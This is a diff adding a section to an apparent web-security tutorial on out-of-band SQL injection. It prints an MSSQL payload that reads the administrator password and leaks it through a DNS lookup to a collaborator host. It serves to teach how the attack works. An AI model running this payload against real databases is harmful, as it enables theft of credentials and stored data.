@@ -218,3 +218,35 @@ If the external server receives this lookup, it confirms that the injected SQL w
 Out-of-band techniques can also sometimes include sensitive data directly inside the generated network request, allowing information to be exfiltrated without extracting it through HTTP responses one character at a time.
 
 The exact technique used to generate external interactions depends on the database system.
+
+#### Exfiltrating data through OAST
+
+After confirming that the database can trigger external network interactions, the same channel can sometimes be used to exfiltrate data directly.
+
+For example, on Microsoft SQL Server:
+
+```text
+'; declare @p varchar(1024);
+set @p=(SELECT password FROM users WHERE username='Administrator');
+exec('master..xp_dirtree "//'+@p+'.example.burpcollaborator.net/a"')--
+```
+
+The injected query retrieves the administrator password and inserts it into a domain name.
+
+If the password is:
+
+```text
+S3cure
+```
+
+the database may perform a DNS lookup for:
+
+```text
+S3cure.example.burpcollaborator.net
+```
+
+The external OAST server can then observe the DNS request and recover the leaked value directly.
+
+This can be much more efficient than extracting data one character at a time through response differences, errors, or timing delays.
+
+The exact exfiltration technique depends on the database system.
